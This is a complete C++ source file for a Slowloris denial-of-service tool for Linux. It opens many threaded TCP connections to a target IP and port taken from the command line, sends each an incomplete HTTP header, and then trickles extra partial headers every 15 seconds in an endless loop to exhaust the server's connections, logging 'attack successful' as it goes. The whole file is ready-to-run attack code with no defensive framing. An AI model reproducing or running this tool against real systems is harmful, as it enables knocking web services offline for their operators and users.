//os: linux
//compile: g++ main.cpp -std=c++0x and -pthread -o slowloris
#include <stdio.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <sys/types.h>   //used for various socket attributes, and multi-threading ~ winsock for linux
#include <sys/socket.h>  //socket defined here ~ winsock for linux
#include <netinet/in.h>  //contains information regarding target ip, port, family
#include <arpa/inet.h>   //parses ip address into network readable
#include <cstring>       //used for strlen()
#include <vector>        //expandable list
#include <unistd.h>      //sleep function
#include <thread>        //multi-threading

void initialSendSocket(int socketNum) {
	char incompleteHeader[255];
	sprintf(incompleteHeader,"GET /%d HTTP/1.1\r\n",(rand()%99999));
	send(socketNum,incompleteHeader,strlen(incompleteHeader),0);
	sprintf(incompleteHeader,"Host: \r\n");
	send(socketNum,incompleteHeader,strlen(incompleteHeader),0);
	sprintf(incompleteHeader,"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
	send(socketNum,incompleteHeader,strlen(incompleteHeader),0);
	sprintf(incompleteHeader,"Content-Length: %d\r\n",(rand()%99999+1000));
	send(socketNum,incompleteHeader,strlen(incompleteHeader),0);
}

void spamPartialHeaders(struct sockaddr_in target, std::vector<int> socketList, int totalSockets) {
	for (int i = 0; i < totalSockets; i++) {
		//std::cout << "Piping packets... " << std::endl;
		try {
			char incompleteHeader[50];
			sprintf(incompleteHeader, "X-a: %d\r\n", (rand() % 99999));
			send(socketList.at(i), incompleteHeader, strlen(incompleteHeader), 0);
		}
		catch(std::exception e) {
			socketList.erase(socketList.begin() + i);
			socketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
			connect(socketList.at(totalSockets - 1),(struct sockaddr *) &target, sizeof(target));
			initialSendSocket(socketList.at(i));
		}
	}
}

int main(int argc, char* argv[]) {

	//must have 4 (+1 = name) args
	if (argc < 5) {
		 std::cerr << "usage: " << argv[0] << " <target_ip> <target_port> <num_sockets> <num_threads> -v" << std::endl;
		 return 1;
	}

	//setup
	const char* target_ip = argv[1];
	unsigned short target_port = atoi(argv[2]);
	int totalSockets = atoi(argv[3]);
	int totalThreads = atoi(argv[4]);
	std::thread threadArray[totalThreads];
	bool verbose = ((argc > 5) ? ((argv[5] == std::string("-v")) ? true : false) : false);

	/* sockets will be divided into threads
	** ex.
	**   thread  = 2
	**   sockets = 80
	** program will use 2 threads with 40 sockets
	*/
	int socketDensity = totalSockets / totalThreads;


	std::vector<std::vector<int>> socketListPartitions;
	struct sockaddr_in target;
	target.sin_family = AF_INET;
	target.sin_port = htons(target_port);
	inet_pton(AF_INET, target_ip, &target.sin_addr);


	std::cout << "> target IP   = " << target_ip << std::endl;
	std::cout << "> target port = " << target_port << std::endl;
	std::cout << "> verbose     = " << (verbose ? "true" : "false") << std::endl;
	std::cout << "> making " << totalThreads << " thread(s) with " << socketDensity << " socket(s)" << std::endl;
	

	for (int i = 0; i < totalThreads; i++) {
		std::vector<int> currentSocketList;
		int numSockets = ((i == (totalThreads-1)) ? (socketDensity + totalSockets % totalThreads) : socketDensity);

		for (int j = 0 ; j < numSockets; j++) {
			currentSocketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
			if (currentSocketList.at(j) < 1) {
				std::cerr << "# thread " << i+1 << ": socket " << j+1 << ": ERROR: could not create" << std::endl;
				return 1;
			}

			if (verbose) {
				std::cout << "# thread " << i+1 << ": socket " << j+1 << ": created" << std::endl;
			}
			
			int check = connect(currentSocketList.at(j), (struct sockaddr *) &target,sizeof(target));
			if (check < 0) {
				std::cerr << "# thread " << i+1 << ": socket " << j+1 << ": ERROR: could not connect";
				std::cerr << " (perhaps a nonexistent IP or unopened port?)" << std::endl;
				return 1;
			}

			if (verbose) { std::cout << "# thread " << i+1 << ": socket " << j+1 << ": connected" << std::endl; }

			initialSendSocket(currentSocketList.at(j));
			if (verbose) { std::cout << "# thread " << i+1 << ": socket " << j+1 << ": sent incomplete header" << std::endl; }
		}
		
		socketListPartitions.push_back(currentSocketList);
	}

	int iterations = 0;
	while (true) {
		std::cout << std::endl;
		iterations++;
		std::cout << "# iterations: " << iterations << std::endl;
		std::cout << "# restarting attacks..." << std::endl;
		for (int i = 0; i < totalThreads; i++) {
			std::cout << "# thread " << i+1 << ": keeping " << socketDensity << " sockets open" << std::endl;
			threadArray[i] = std::thread(spamPartialHeaders, target, socketListPartitions.at(i), (socketListPartitions.at(i).size()));
			std::cout << "# thread " << i+1 << ": attack successful" << std::endl;
		}
		for (int i = 0; i < totalThreads; i++) {
			threadArray[i].join();
			std::cout << "# thread " << i+1 << ": attack paused " << std::endl;
		}
		//timeout
		int sleep_for = 15;
		std::cout << "# timeout: " << sleep_for << " seconds" << std::endl;
		sleep(sleep_for);
	}

}
